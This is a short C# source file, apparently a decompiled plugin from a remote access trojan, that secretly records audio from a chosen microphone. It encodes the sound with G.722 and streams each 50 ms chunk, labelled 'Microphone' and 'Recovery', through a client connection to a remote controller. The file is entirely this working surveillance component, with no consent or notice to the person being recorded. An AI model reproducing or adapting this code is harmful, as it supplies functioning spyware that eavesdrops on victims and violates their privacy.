using System;
using Leb128;
using NAudio.Wave;
using Plugin.Helper;

namespace Plugin.Handler;

internal class HandlerSoundRecover
{
	public static bool isok;

	public static WaveInEvent waveIn;

	public static G722ChatCodec g722;

	public static void Recover(int Device)
	{
		isok = true;
		waveIn = new WaveInEvent();
		waveIn.DeviceNumber = Device;
		g722 = new G722ChatCodec();
		waveIn.DataAvailable += waveIn_DataAvailable;
		waveIn.WaveFormat = g722.RecordFormat;
		waveIn.BufferMilliseconds = 50;
		waveIn.StartRecording();
	}

	public static void waveIn_DataAvailable(object sender, WaveInEventArgs e)
	{
		try
		{
			if (isok)
			{
				Client1.Send(LEB128.Write(new object[3]
				{
					"Microphone",
					"Recovery",
					g722.Encode(e.Buffer, 0, e.Buffer.Length)
				}));
			}
		}
		catch (Exception ex)
		{
			Client1.Error(ex.Message);
		}
	}

	public static void Stop()
	{
		isok = false;
		waveIn.StopRecording();
		if (waveIn != null)
		{
			waveIn.Dispose();
		}
		if (g722 != null)
		{
			g722.Dispose();
		}
	}
}
